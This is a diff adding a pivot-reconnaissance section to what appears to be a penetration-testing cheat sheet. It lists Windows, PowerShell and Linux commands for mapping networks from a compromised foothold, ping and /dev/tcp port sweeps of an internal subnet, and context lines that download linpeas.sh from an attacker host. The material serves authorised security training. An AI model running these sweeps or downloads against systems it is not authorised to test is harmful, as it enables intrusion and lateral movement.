@@ -121,3 +121,63 @@ wget http://{{LHOST}}/linpeas.sh -O /tmp/linpeas.sh
 curl http://{{LHOST}}/linpeas.sh -o /tmp/linpeas.sh
 ```
 
+## Internal host discovery from a foothold (pivot recon)
+
+> Find hosts/subnets the compromised box can reach but Kali can't. Run these **on the foothold**. (Tunnelling to actually reach them is kept in a separate folder.)
+
+### What networks / hosts can this box see?
+
+```cmd
+:: Windows — interfaces, routes, neighbours, active connections
+ipconfig /all
+route print
+arp -a
+netstat -ano
+```
+
+```powershell
+# PowerShell equivalents
+Get-NetIPConfiguration
+Get-NetRoute
+Get-NetNeighbor
+Get-NetTCPConnection -State Established | ft -Auto
+```
+
+```bash
+# Linux — interfaces, routes, ARP/neighbours, hosts file, connections
+ip a
+ip route
+ip neigh          # or: arp -a
+cat /etc/hosts
+netstat -antup    # or: ss -antup
+```
+
+### Ping-sweep an internal /24 (from the foothold)
+
+```cmd
+:: Windows cmd
+for /L %i in (1,1,254) do @ping -n 1 -w 100 10.10.10.%i | find "Reply"
+```
+
+```powershell
+# PowerShell
+1..254 | % { $ip="10.10.10.$_"; if (Test-Connection -Count 1 -Quiet -ComputerName $ip) { "$ip up" } }
+```
+
+```bash
+# Linux (parallel)
+for i in $(seq 1 254); do (ping -c1 -W1 10.10.10.$i >/dev/null && echo "10.10.10.$i up") & done; wait
+```
+
+### Port-check sweep (when ICMP is blocked)
+
+```powershell
+# PowerShell — check a single port across the /24 (e.g. 445)
+1..254 | % { $ip="10.10.10.$_"; if ((New-Object Net.Sockets.TcpClient).ConnectAsync($ip,445).Wait(200)) { "$ip:445 open" } }
+```
+
+```bash
+# Linux — bash /dev/tcp, no nmap needed
+for i in $(seq 1 254); do (echo > /dev/tcp/10.10.10.$i/445) 2>/dev/null && echo "10.10.10.$i:445 open"; done
+```
+
